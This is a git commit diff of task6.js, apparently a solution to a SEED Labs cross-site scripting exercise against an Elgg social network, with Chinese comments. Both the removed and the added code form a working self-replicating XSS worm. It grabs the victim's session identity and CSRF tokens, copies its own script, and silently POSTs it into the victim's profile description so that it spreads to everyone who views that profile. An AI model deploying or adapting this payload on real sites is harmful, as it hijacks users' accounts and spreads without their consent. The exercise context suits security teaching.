a56dc84c9ce98d1650bad603488b25fb7deb1f10
HakureiPOI <114349635+HakureiPOI@users.noreply.github.com>
2025-04-16 12:07:05 +0800

    Update task6.js

--- task6.js
+++ task6.js
@@ -1,28 +1,33 @@
-<script type="text/javascript">
-window.onload = function(){
-    var userName = elgg.session.user.name;
+<script id="worm" type="text/javascript">
+window.onload = function () {
+    // 获取必要信息
+    var name = "name=" + elgg.session.user.name;
     var guid = "guid=" + elgg.session.user.guid;
-    var ts = "__elgg_ts=" + elgg.security.token.__elgg_ts;
-    var token = "__elgg_token=" + elgg.security.token.__elgg_token;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
-    // 构造包含蠕虫代码的 payload
-    var wormCode = encodeURIComponent(
-        '<script type="text/javascript">(' + arguments.callee.toString() + ')();</script>'
-    );
+    // 防止攻击自己
+    var samyGuid = "59";
+    if (elgg.session.user.guid == samyGuid) return;
 
-    // 构造带有自复制脚本的描述字段内容
-    var description = "This is a test XSS worm. " + wormCode;
+    // 获取自身代码
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+    var jsCode = document.getElementById("worm").innerHTML;
+    var tailTag = "</" + "script>";
+    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
 
-    // 拼接完整表单数据
-    var content = guid + "&" + ts + "&" + token + "&description=" + description;
+    // 构造用于修改用户 profile 的 POST 内容
+    var content = token + ts
+                + "&guid=" + elgg.session.user.guid
+                + "&name=" + elgg.session.user.name
+                + "&description=" + wormCode
+                + "&accesslevel[description]=2"; // 可见性：所有人
 
-    // 避免攻击者自己被反复感染
-    var samyGuid = "59";  // 可更换为攻击者账号的GUID
-    if (elgg.session.user.guid != samyGuid) {
-        var Ajax = new XMLHttpRequest();
-        Ajax.open("POST", "http://www.seed-server.com/action/profile/edit", true);
-        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        Ajax.send(content);
-    }
+    // 创建 AJAX 请求，向服务器发送修改请求
+    var sendurl = "http://www.seed-server.com/action/profile/edit";
+    var Ajax = new XMLHttpRequest();
+    Ajax.open("POST", sendurl, true);
+    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    Ajax.send(content);
 }
 </script>
